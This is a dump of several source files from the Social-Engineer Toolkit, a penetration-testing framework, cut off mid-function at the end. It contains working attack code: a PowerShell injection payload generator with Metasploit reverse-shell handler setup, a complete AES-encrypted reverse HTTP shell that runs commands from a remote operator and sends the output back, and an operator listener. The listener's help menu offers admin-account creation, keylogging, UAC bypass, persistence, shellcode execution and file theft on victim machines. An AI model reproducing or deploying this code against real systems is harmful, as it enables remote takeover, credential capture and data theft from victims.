            subprocess.Popen("keytool -import -alias MyCert -file %s" % (cert_path), shell=True).wait()

    # if our certificate is in the data store
    if os.path.isfile(cert_path):
        # sign the applet with the imported certificate
        subprocess.Popen("jarsigner -signedjar Signed_Update.jar %s/src/html/unsigned/unsigned.jar MyCert" % (definepath), shell=True).wait()
        # move it into our html directory
        subprocess.Popen("mv Signed_Update.jar %s/Signed_Update.jar.orig" % (setdir), shell=True).wait()
        # move back to original directory
        print_status("Java Applet is now signed and will be imported into the java applet website attack from now on...")

########NEW FILE########
__FILENAME__ = web_start
#!/usr/bin/env python
# This is just a simple import for web_start
import sys
import setcore
me = setcore.mod_name()
setcore.debug_msg(me,"importing 'src.html.spawn'",1)
sys.path.append("src/html")
try: reload(spawn)
except: pass

########NEW FILE########
__FILENAME__ = prep
#!/usr/bin/python
import sys
import subprocess
import re
import os
import time
from src.core.setcore import *

# grab stage encoding flag
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off": stage_encoding = "false"
else: stage_encoding = "true"

# check to see if we are just generating powershell code
powershell_solo = check_options("POWERSHELL_SOLO")

# check if port is there
port = check_options("PORT=")

# check if we are using auto_migrate
auto_migrate = check_config("AUTO_MIGRATE=")

# check if we are using pyinjection
pyinjection = check_options("PYINJECTION=")
if pyinjection == "ON":
    # check to ensure that the payload options were specified right
    if os.path.isfile(setdir + "/payload_options.shellcode"):
          pyinjection = "on"
          print_status("Multi/Pyinjection was specified. Overriding config options.")
    else: pyinjection = "off"

# grab ipaddress
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = raw_input("Enter the ipaddress for the reverse connection: ")
    update_options("IPADDR=" + ipaddr)

# check to see if we are using multi powershell injection
multi_injection = check_config("POWERSHELL_MULTI_INJECTION=").lower()

# turn off multi injection if pyinjection is specified
if pyinjection == "on": multi_injection = "off"

# check what payloads we are using
powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")

# if we specified a hostname then default to reverse https/http
if validate_ip(ipaddr) == False:
    powershell_inject_x86 = "windows/meterpreter/reverse_http"

# prompt what port to listen on for powershell then make an append to the current
# metasploit answer file
if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
    # if we have multi injection on, don't worry about these
    if multi_injection != "on":
        if pyinjection == "off":
            print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
            port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
            if port == "": port = "443"
            fileopen = file("%s/meta_config_multipyinjector" % (setdir), "r")
            data = fileopen.read()
            match = re.search(port, data)
            if not match:
                filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                filewrite.write("\nuse exploit/multi/handler\n")
                if auto_migrate == "ON":
                    filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
                filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, ipaddr, port, stage_encoding))
                filewrite.close()

# if we have multi injection on, don't worry about these
if multi_injection != "on":
    if pyinjection == "off":
        # check to see if the meta config multi pyinjector is there
        if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
            if check_options("PORT=") != 0:
                port = check_options("PORT=")
            # if port.options isnt there then prompt
            else:
                port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
                if port == "": port = "443"
                update_options("PORT=" + port)

# turn off multi_injection if we are riding solo from the powershell menu
if powershell_solo == "ON": 
    multi_injection = "off"
    pyinjection = "on"

# if we are using multi powershell injection
if multi_injection == "on":
    if pyinjection == "off":
        print_status("Multi-Powershell-Injection is set to ON, this should be sweet...")

# define a base variable
x86 = ""

# specify a list we will use for later
multi_injection_x86 = ""

# here we do some funky loops so we don't need to rewrite the code below
if multi_injection == "on":
    port = check_config("POWERSHELL_MULTI_PORTS=")
    port = port.split(",")

if multi_injection == "on":
    # iterate through the ports, used for POWERSHELL_MULTI_PORTS
    for ports in port:
        # dont cycle through if theres a blank
        if ports != "":
            print_status("Generating x86-based powershell injection code for port: %s" % (ports))
            multi_injection_x86 = multi_injection_x86 + "," +  generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, ports, x86)

            if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), ports)
                if port_check == False:
                    filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                    filewrite.write("\nuse exploit/multi/handler\n")
                    if auto_migrate == "ON":
                        filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, stage_encoding, ports))
                    filewrite.close()

            # if we aren't using multi pyinjector
            if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                # if meta config isn't created yet then create it
                if not os.path.isfile("%s/meta_config" % (setdir)):
                    filewrite = file("%s/meta_config" % (setdir), "w")
                    filewrite.write("")
                    filewrite.close()
                port_check = check_ports("%s/meta_config" % (setdir), ports)
                if port_check == False:
                    filewrite = file("%s/meta_config" % (setdir), "a")
                    filewrite.write("\nuse exploit/multi/handler\n")
                    if auto_migrate == "ON":
                        filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, stage_encoding, ports))
                    filewrite.close()

# here we do everything if pyinjection or multi pyinjection was specified
if pyinjection == "on":
    multi_injection_x86 = ""
    # read in the file we need for parsing
    fileopen = file(setdir + "/payload_options.shellcode", "r")
    payloads = fileopen.read()[:-1].rstrip() # strips an extra ,
    payloads = payloads.split(",")
    # format: payload<space>port
    for payload in payloads:
        #format: payload<space>port
        payload = payload.split(" ")
        powershell_inject_x86 = payload[0]
        port = payload[1]        
        print_status("Generating x86-based powershell injection code...")
        multi_injection_x86 = multi_injection_x86 + "," + generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)

# if its turned to off
if multi_injection == "off":
    if pyinjection == "off":
        print_status("Generating x86-based powershell injection code...")
        x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)

# if we are specifying multi powershell injection
if multi_injection == "on" or pyinjection == "on":
    x86 = multi_injection_x86[1:] # remove comma at beginning

# check to see if we want to display the powershell command to the user
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
    print_status("Printing the x86 based encoded code...")
    time.sleep(3)
    print x86

filewrite = file("%s/x86.powershell" % (setdir), "w")
filewrite.write(x86)
filewrite.close()
print_status("Finished generating powershell injection bypass.")
print_status("Encoded to bypass execution restriction policy...")

########NEW FILE########
__FILENAME__ = http_shell
#!/usr/bin/python
##########################################################################################################################
#
#
#  AES Encrypted Reverse HTTP Shell by:
#
#         Dave Kennedy (ReL1K)
#      http://www.trustedsec.com
#
##########################################################################################################################
#
##########################################################################################################################
#
# To compile, you will need pyCrypto, it's a pain to install if you do it from source, should get the binary modules
# to make it easier. Can download from here:
# http://www.voidspace.org.uk/cgi-bin/voidspace/downman.py?file=pycrypto-2.0.1.win32-py2.5.zip
#
##########################################################################################################################
#
# This shell works on any platform you want to compile it in. OSX, Windows, Linux, etc.
#
##########################################################################################################################
#
##########################################################################################################################
#
# Below is the steps used to compile the binary. py2exe requires a dll to be used in conjunction
# so py2exe was not used. Instead, pyinstaller was used in order to byte compile the binary.
#
##########################################################################################################################
#
# export VERSIONER_PYTHON_PREFER_32_BIT=yes
# python Configure.py
# python Makespec.py --onefile --noconsole shell.py
# python Build.py shell/shell.spec
#
###########################################################################################################################


import urllib
import urllib2
from Crypto.Cipher import AES
import sys
import os
import httplib
import subprocess
import base64
import time


# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32
# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# secret key, change this if you want to be unique
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
# random junk
random = "sdfdsfdsdfsfd@#2$"
# create a cipher object using the random secret
cipher = AES.new(secret)

# TURN THIS ON IF YOU WANT PROXY SUPPORT
PROXY_SUPPORT = "OFF"
# THIS WILL BE THE PROXY URL
PROXY_URL = "http://proxystuff:80"
# USERNAME FOR THE PROXY
USERNAME = "username_here"
# PASSWORD FOR THE PROXY
PASSWORD = "password_here"

# here is where we set all of our proxy settings
if PROXY_SUPPORT == "ON":
    auth_handler = urllib2.HTTPBasicAuthHandler()
    auth_handler.add_password(realm='RESTRICTED ACCESS', uri=PROXY_URL,
                              user=USERNAME, passwd=PASSWORD)
    opener = urllib2.build_opener(auth_handler)
    urllib2.install_opener(opener)

try:
    # our reverse listener ip address
    address = sys.argv[1]
    # our reverse listener port address
    port = sys.argv[2]

# except that we didn't pass parameters
except IndexError:
    print " \nAES Encrypted Reverse HTTP Shell by:"
    print "        Dave Kennedy (ReL1K)"
    print "      http://www.trustedsec.com"
    print "Usage: shell.exe <reverse_ip_address> <rport>"
    time.sleep(0.1)
    sys.exit()

# loop forever
while 1:
    # open up our request handelr
    req = urllib2.Request('http://%s:%s' % (address,port))
    # grab our response which contains what command we want
    message = urllib2.urlopen(req)
    # base64 unencode
    message = base64.b64decode(message.read())
    # decrypt the communications
    message = DecodeAES(cipher, message)
    # quit out if we receive that command
    if message == "quit" or message == "exit":
        sys.exit()
    # issue the shell command we want
    message = message.replace("{", "")
    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # read out the data of stdout
    data = proc.stdout.read() + proc.stderr.read()
    # encrypt the data
    data = EncodeAES(cipher, data)
    # base64 encode the data
    data = base64.b64encode(data)
    # urlencode the data from stdout
    data = urllib.urlencode({'cmd': '%s'}) % (data)
    # who we want to connect back to with the shell
    h = httplib.HTTPConnection('%s:%s' % (address,port))
    # set our basic headers
    headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    # actually post the data
    h.request('POST', '/index.aspx', data, headers)

########NEW FILE########
__FILENAME__ = listener
#!/usr/bin/env python
from socket import *
import os
import threading
import sys
import re
import thread
import time
import select
import base64
import datetime
import subprocess
import binascii
from src.core.setcore import *

definepath = os.getcwd()
sys.path.append(definepath)

# cleanup
if os.path.isfile(setdir + "/uac.address"):
    os.remove(setdir + "/uac.address")
if os.path.isfile(setdir + "/system.address"):
    os.remove(setdir + "/system.address")

# will remove this later
core_modules = True

####################################################################
#                                                                  #
# The Social-Engineer Toolkit Interactive Shell Listener           #
#                                                                  #
####################################################################

def start_listener():

    # grab the operating system
    operating_system = check_os()
    # try to import readline, if not, disable tab completion
    tab_complete = True
    try:
        import readline
    # handle exception if readline isn't imported
    except ImportError:
        print "[!] python-readline is not installed, tab completion will be disabled."
        # turn tab_complete to false and disable it
        tab_complete = False

    # specify we are using core module, need to clean this up and remove later
    core_module = True

    # allow readline tab completion
    if tab_complete == True:
        readline.parse_and_bind("tab: complete")

    HOST = '' # bind to all interfaces

    # try command line arguments first
    try:
        PORT = int(sys.argv[1])

    # handle index error
    except IndexError:
        if check_options("PORT=") != 0:
            PORT = check_options("PORT=")

        else:
            # port number prompt for SET listener
            PORT = raw_input(setprompt("0", "Port to listen on [443]"))
            if PORT == "":
                # if null then default to port 443
                print "[*] Defaulting to port 443 for the listener."
                PORT = 443
                update_config("PORT=443")

        try:
            # make the port an integer
            PORT = int(PORT)
        except ValueError:
            while 1:
                print_warning("Needs to be a port number!")
                PORT = raw_input(setprompt("0", "Port to listen on: "))
                if PORT == "":
                    PORT = 443
                    break
                try:
                    PORT = int(PORT)
                    break
                except ValueError:
                    PORT = 443
                    break

    # log error messages
    def log(error):
        # check to see if path is here
        if os.path.isfile("src/logs/"):
            # grab the date and time for now
            now=datetime.datetime.today()
            # all error messages will be posted in set_logfile.txt
            filewrite=file("src/logs/set_logfile.log", "a")
            filewrite.write(now + error + "\r\n")
            filewrite.close()

    # specify it as nothing until we make it past our encryption check
    try:

        from Crypto.Cipher import AES

        # set encryption key to 1
        encryption = 1

        print_status("Crypto.Cipher library is installed. AES will be used for socket communication.")
        print_status("All communications will leverage AES 256 and randomized cipher-key exchange.")
        # the block size for the cipher object; must be 16, 24, or 32 for AES
        BLOCK_SIZE = 32

        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'

        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

        # one-liners to encrypt/encode and decrypt/decode a string
        # encrypt with AES, encode with base64
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

        # generate a random secret key
        secret = os.urandom(BLOCK_SIZE)

        # create a cipher object using the random secret
        cipher = AES.new(secret)

    # if it isn't import then trigger error and turn off encryption
    except ImportError:
        # this means that python-crypto is not installed and we need to set the encryption flag to 0, which turns off communications
        encryption = 0
        print_warning("Crypto.Cipher python module not detected. Disabling encryption.")
        if operating_system != "windows":
            print_warning("If you want encrypted communications download from here: http://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.3.tar.gz")
            print_warning("Or if your on Ubuntu head over to: http://packages.ubuntu.com/search?keywords=python-crypto")
            print_warning("Or you can simply type apt-get install python-crypto or in Back|Track apt-get install python2.5-crypto")

    # universal exit message
    def exit_menu():
        print "\n[*] Exiting the Social-Engineer Toolkit (SET) Interactive Shell."

    mysock = socket.socket(AF_INET, SOCK_STREAM)
    mysock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    addr = (HOST,PORT)
    try:
        mysock.bind(addr)
        mysock.listen(100000)
    except Exception, error:
        if core_modules == True:
            log(error)
            print_error("ERROR:Unable to bind to listener port, do you have something else listening?")
            sys.exit() #exit_set()
        if core_modules == False: sys.exit("[!] Unable to bind to interfact. Try again.")

    # base count handler
    count = 0

    # send packet is used to determine if encryption is in use or not
    def send_packet(message,conn,encryption):

        # we put a try/except block here in case of socket error. if it has an exception
        # here, it would completely kill the session. we want to make it as stable as possible even
        # after error.
        try:

            # if encryption is enabled then send this
            if encryption == 1:

                # we encrypt our output here
                encoded = EncodeAES(cipher, message)
                # we take the length of the encrypted string
                normal_size = len(encoded)
                # we turn the length of our string into a string literal
                normal_size = str(normal_size)
                # we encrypt our string literal
                normal_size_crypt= EncodeAES(cipher, normal_size)
                # we send our encrypted string literal to let our server know h$
                # true encrypted string is
                conn.send(str(normal_size_crypt))
                time.sleep(0.3)
                # we send our encrypted string
                conn.send(str(encoded))

            # if encryption is disabled then send this
            if encryption == 0:
                message_size = str(len(message))
                conn.send(message_size)
                conn.send(str(message))

        # handle exceptions
        except Exception, e:
            print_warning("An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass

    # decrypt received packets
    def decrypt_packet(message,encryption):
        # try/except block to keep socket alive
        try:

            # if encrypt then decode
            if encryption == 1:
                return DecodeAES(cipher, message)

            # if not encrypted then return result
            if encryption == 0:
                return message

        # handle exceptions
        except Exception, e:
            print_warning("An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass

    # handle tab completion here for set interactive menu
    class Completer:
        def __init__(self):
            if operating_system == "windows":
                self.words = ["shell","localadmin", "help", "?", "domainadmin", "ssh_tunnel", "bypassuac", "lockworkstation", "grabsystem", "download", "upload", "ps", "kill", "keystroke_start", "keystroke_dump", "reboot", "persistence", "removepersistence", "shellcode", "cls", "clear"]
            if operating_system == "posix":
                self.words = ["shell", "help", "?", "ssh_tunnel", "download", "upload", "reboot", "cls", "clear"]
            self.prefix = None

        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None

    # handle tab completion here for initial choice selection
    class Completer2:
        def __init__(self):
            self.words = []
            self.prefix = None

        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None


    # main socket handler
    def handle_connection(conn,addr,encryption,operating_system):

        print_status("Dropping into the Social-Engineer Toolkit Interactive Shell.")

        # put an exceptions block in here
        try:

            # if we are leveraging encryption
            if encryption == 1:
                # generate a random 52 character string
                random_string = os.urandom(52)
                data=conn.send(random_string)
                # confirm that we support encryption
                data = conn.recv(1024)
                if data == random_string:
                    # This method isn't probably the most desirable since it can
                    # be intercepted and unhex'd during transmission. Provides a
                    # good level of encryption unless the ciphertext is used as the
                    # AES decryption string. This is a first pass, will improve over
                    # time. Could hardcode keys on server/client but would have an
                    # even less desirable effect. Overall, solution will be to use
                    # pub/private RSA certs
                    secret_send = binascii.hexlify(secret)
                    conn.send(secret_send)

                # if we didn't receive the confirmation back then we don't support encryption
   
                else : encryption = 0

            # if we aren't using encryption then tell the victim
            if encryption == 0:
                # generate a random 51 character string
                random_string = os.urandom(51)
                conn.send(random_string)
                # acknowledge encryption has been disabled
                data = conn.recv(51)
                # decrypt the data if applicable
                data=decrypt_packet(data,encryption)

        except Exception, e:
            print e
            print_warning("Looks like the session died. Dropping back into selection menu.")
            return_continue()
            global count
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
            sys.exit() #exit_set()

        # initial try loop to catch keyboard interrupts and exceptions
        try:

            # start initial loop for menu
            while 1:
                # main SET menu
                if tab_complete == True:
                    completer = Completer()
                    readline.set_completer(completer.complete)
                data=raw_input(setprompt(["25"], ""))

                # if data is equal to quit or exit then break out of loop and exit
                if data == "quit" or data == "exit" or data == "back":
                    print_warning("Dropping back to list of victims.\n")
                    send_packet("quit", conn, encryption)
                    break

                if data == "cls" or data == "clear":
                    os.system("clear")

                # if user specifies help do this
                if data == "help" or data == "?":

                    print "Welcome to the Social-Engineer Toolkit Help Menu.\n\nEnter the following commands for usage:"

                    # universal commands
                    if operating_system == "posix" or operating_system == "windows":
                        print """
Command: shell
Explanation: drop into a command shell
Example: shell

Command: download <path_to_file>
Explanation: downloads a file locally to the SET root directory.
Example: download C:\\boot.ini or download /etc/passwd

Command: upload <path_to_file_on_attacker> <path_to_write_on_victim>
Explanation: uploads a file to the victim system
Example: upload /root/nc.exe C:\\nc.exe or upload /root/backdoor.sh /root/backdoor.sh

Command: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>
Explanation: This module tunnels ports from the compromised victims machine back to your machine.
Example: ssh_tunnel publicipaddress 22 80 root complexpassword?! 80

Command: exec <command>
Explanation: Execute a command on your LOCAL 'attacker' machine.
Example exec ls -al

Command: ps
Explanation: List running processes on the victim machine.
Example: ps

Command: kill <pid>
Explanation: Kill a process based on process ID (number) returned from ps.
Example: kill 3143

Command: reboot now
Explanation: Reboots the remote server instantly.
Example: reboot now"""
                    # if we're running under windows
                    if operating_system == "windows":
                        print """
Command: localadmin <username> <password>
Explanation: adds a local admin to the system
Example: localadmin bob p@55w0rd!

Command: domainadmin <username> <password>
Explanation: adds a local admin to the system
Example: domainadmin bob p@55w0rd!

Command: bypassuac <ipaddress_of_listener> <port_of_listener> <x86 or x64>
Explanation: Trigger another SET interactive shell with the UAC safe flag
Example bypassuac 172.16.32.128 443 x64

Command: grabsystem <ipaddress_of_listener> <port_of_listener>
Explanation: Uploads a new set interactive shell running as a service and as SYSTEM.
Caution: If using on Windows 7 with UAC enabled, run bypassuac first before running this.
Example: grabsystem 172.16.32.128 443

Command: keystroke_start
Explanation: Starts a keystroke logger on the victim machine. It will stop when shell exits.
Example: keystroke_start

Command: keystroke_dump
Explanation: Dumps the information from the keystroke logger. You must run keystroke_start first.
Example: keystroke_dump

Command: lockworkstation
Explanation: Will lock the victims workstation forcing them to log back in. Useful for capturing keystrokes.
Example: lockworkstation

Command: persistence <ipaddress_of_listener> <port_of_listener>
Explanation: Persistence will spawn a SET interactive shell every 30 minutes on the victim machine.
Example: persistence 172.16.32.128 443
Warning: Will not work with UAC enabled *yet*.

Command: removepersistence
Explanation: Will remove persistence from the remote victim machine.
Example: removepersistence

Command: shellcode
Explanation: This will execute native shellcode on the victim machine through python.
Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
"""
                try:
                    # base counter to see if command is invalid
                    base_counter = 0

                    # do a quick search to execute a local command
                    match=re.search("exec", data)
                    if match:

                        # trigger we hit
                        base_counter = 1

                        # define temp_data to test if we have more than one command other than exec
                        temp_data = data.split(" ")

                        # remove the exec name from the command
                        data = data.replace("exec ", "")
                        # grab the command
                        command = data
                        # assign data to exec for handler below
                        data = "exec"

                        # see if we have a value, if not through an indexerror
                        data = "exec test"
                        data = data.split(" ")
                        temp_data = temp_data[1]
                        data = "exec"

                    # split into tuple in case localadmin is used

                    data=data.split(" ")
                    # if data[0] is localadmin then split up the creds and data
                    if data[0] == "localadmin":
                        creds="%s,%s" % (data[1],data[2])
                        data="localadmin"
                        base_counter = 1


                    # if data[0] is domainadmin then split up the creds and data
                    if data[0] == "domainadmin":
                        creds="%s,%s" % (data[1],data[2])
                        data="domainadmin"
                        base_counter = 1

                    # if data[0] is equal to shell then go to normal
                    if data[0] == "shell":
                        base_counter = 1
                        data = data[0]

                    # if data[0] is equal to download
                    if data[0] == "download":
                        # assign download_path
                        download_path=data[1]
                        # assign data[0]
                        data = data[0]
                        base_counter = 1

                    # if data[0] is equal to ssh_port_forward then use port forwarding
                    if data[0] == "ssh_tunnel":
                        # IP of the SSH server
                        ssh_server_ip = data[1]
                        # PORT of the SSH server
                        ssh_server_port_address = data[2]
                        # PORT to use on localhost for tunneled protcol
                        ssh_server_tunnel_port = data[3]
                        # username for SSH server
                        ssh_server_username = data[4]
                        # password for SSH server
                        ssh_server_password = data[5]
                        # PORT to forward from victim
                        victim_server_port = data[6]
                        # specify data as ssh_port_tunnel
                        data = data[0]
                        base_counter=1

                    # if data[0] is equal to upload_file
                    if data[0] == "upload":
                        # assign executable path to upload
                        upload = data[1]
                        # assign path to write file on opposite side
                        write_path = data[2]
                        # assign data[0]
                        data = data[0]
                        base_counter = 1

                    # bypassuac
                    if data[0] == "bypassuac":
                        # ipaddress and port
                        ipaddress = data[1] + " " + data[2]
                        exe_platform = data[3]
                        data = data[0]
                        base_counter = 1

                    # persistence
                    if data[0] == "persistence":
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1

                    if data[0] == "removepersistence":
                        base_counter = 1
                        data = data[0]

                    if data[0] == "keystroke_start":
                        data = "keystroke_start"
                        base_counter = 1

                    if data[0] == "keystroke_dump":
                        data = "keystroke_dump"
                        base_counter = 1

                    # grabsystem
                    if data[0] == "grabsystem":
                        # define ipaddress
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1

                    # lock workstation
                    if data[0] == "lockworkstation":
                        data = "lockworkstation"
                        base_counter = 1

                    # if data[0] is equal to ps
                    if data[0] == "ps":
                        data = "ps"
                        base_counter = 1

                    # if data[0] is equal to reboot
                    if data[0] == "reboot":
                        if data[1] == "now":
                            data = "reboot now"
                            base_counter = 1

                    # if data[0] is equal kill
                    if data[0] == "kill":
                        pid_number = data[1]
                        data = "kill"
                        base_counter = 1

                    # if data[0] is equal to exec
                    if data[0] == "exec":
                        data = "exec"
                        base_counter = 1

                    # shellcodeexec
                    if data[0] == "shellcode":
                        shellcode_inject = raw_input("Paste your shellcode into here: ")
                        shellcode_inject = shellcode_inject.decode("string_escape")
                        data = "shellcode"
                        base_counter = 1

                    if data[0] == "help" or data[0] == "?": base_counter = 1

                    if data[0] == "": base_counter = 1
                    if data[0] == "cls" or data[0] == "clear": base_counter = 1

                    if base_counter == 0: print "[!] The command was not recognized."


                # handle range errors and throw correct syntax
                except IndexError:
                    if data[0] == "kill": print "[!] Usage: kill <pid_id>"
                    if data[0] == "exec": print "[!] Usage: exec <command>"
                    if data[0] == "bypassuac": print "[!] Usage: bypassuac <set_reverse_listener_ip> <set_port> <x64 or x86>"
                    if data[0] == "upload": print "[!] Usage: upload <filename> <path_on_victim>"
                    if data[0] == "download": print "[!] Usage: download <filename>"
                    if data[0] == "ssh_tunnel": print "[!] Usage: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>"
                    if data[0] == "domainadmin": print "[!] Usage: domainadmin <username> <password>"
                    if data[0] == "localadmin": print "[!] Usage: localadmin <username> <password>"
                    if data[0] == "grabsystem": print "[!] Usage: grabsystem <ipaddress_of_listener> <port_of_listener>"
                    if data[0] == "reboot": print "[!] Usage: reboot now"
                    if data[0] == "persistence": print "[!] Usage: persistence <set_reverse_listener_ip> <set_port>"
                    if data[0] == "shellcode": print "[!] Usage: shellcode <paste shellcode>"

                # in case of an attribute error just pass and restart
                except AttributeError,e:
                        # write to log file then pass
                    log(e)
                    pass

                # handle the rest of errors
                except Exception, e:
                    print "[!] Something went wrong, printing error: " + str(e)
                    log(e)
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
                    sys.exit()

                # if data is equal to shell
                if data == "shell":
                    send_packet(data, conn, encryption)
                    print "[*] Entering a Windows Command Prompt. Enter your commands below.\n"
                    while 1:
                        try:
                            # accept raw input
                            data=raw_input(setprompt(["25", "26"], ""))
                            # if we specify exit or quit then get out
                            if data == "exit" or data == "quit" or data == "back":
                                print "[*] Dropping back to interactive shell... "
                                send_packet(data, conn, encryption)
                                break
                            if data != "":
                                send_packet(data, conn, encryption)

                                # this will receive length of data socket we need
                                data = conn.recv(1024)
                                # decrypt the data length
                                data=decrypt_packet(data,encryption)

                                # here is an ugly hack but it works, basically we set two
                                # counters. MSGLEN which will eventually equal the length
                                # of what number was sent to us which represented the length
                                # of the output of the shell command we executed. Dataout
                                # will eventually equal the entire string loaded into our
                                # buffer then sent for decryption.
                                #
                                # A loop is started which continues to receive until we hit
                                # the length of what our entire full encrypted shell output
                                # is equaled. Once that occurs, we are out of our loop and
                                # the full string is sent to the decryption routine and
                                # presented back to us.

                                MSGLEN = 0
                                dataout = ""
                                length = int(data)
                                while 1:
                                    data = conn.recv(1024)
                                    if not data: break
                                    dataout += data
                                    MSGLEN = MSGLEN + len(data)
                                    if MSGLEN == int(length): break

                                # decrypt our command line output
                                data = decrypt_packet(dataout,encryption)
                                # display our output
                                print data

                        # handle error generally means base 10 error message which means there
                        # was no response. Socket probably died somehow.
                        except ValueError, e:
                            # write to log file
                            log(e)
                            print "[!] Response back wasn't expected. The session probably died."
                            garbage1 = ""
                            garbage2 = ""
                            garbage3 = ""
                            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
                            sys.exit() #exit_set()

                # if data is equal to localadmin then flag and add a local user account
                if data == "localadmin":
                    print "[*] Attempting to add a user account with administrative permissions."
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print "[*] User add completed. Check the system to ensure it worked correctly."

                # if data is equal to domainadmin then flag and add a local admin account
                if data == "domainadmin":
                    print "[*] Attempting to add a user account with domain administrative permissions."
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print "[*] User add completed. Check the system to ensure it worked correctly."

                # keystroke logger
                if data == "keystroke_start":
                    send_packet(data, conn, encryption)
                    print "[*] Keystroke logger has been started on the victim machine"

                # dump the data
                if data == "keystroke_dump":
                    send_packet(data, conn, encryption)
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)
                    data = conn.recv(int(data))
                    data=decrypt_packet(data,encryption)
                    print data

                # if data is equal to download
                if data == "download":

                    # trigger our shell to go in downloadfile mode
                    data = "downloadfile"

                    # send that we are in downloadfile mode
                    send_packet(data, conn, encryption)

                    # send our file path
                    send_packet(download_path, conn, encryption)

                    # mark a flag for write
                    download_path = download_path.replace("\\", "_")
                    download_path = download_path.replace("/", "_")
                    download_path = download_path.replace(":", "_")
                    filewrite = file(download_path, "wb")

                    # start a loop until we are finished getting data

                    # recv data
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    # here is an ugly hack but it works, basically we set two
                    # counters. MSGLEN which will eventually equal the length
                    # of what number was sent to us which represented the length
                    # of the output of the file.
                    # Dataout will eventually equal the entire string loaded into our
                    # buffer then sent for decryption.
                    #
                    # A loop is started which continues to receive until we hit
                    # the length of what our entire full encrypted file output
                    # is equaled. Once that occurs, we are out of our loop and
                    # the full string is sent to the decryption routine and
                    # presented back to us.

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)


                    data = decrypt_packet(data,encryption)

                    # if the file wasn't right
                    if data == "File not found.":
                        print "[!] Filename was not found. Try again."
                        break

                    if data != "File not found.":
                        # write the data to file
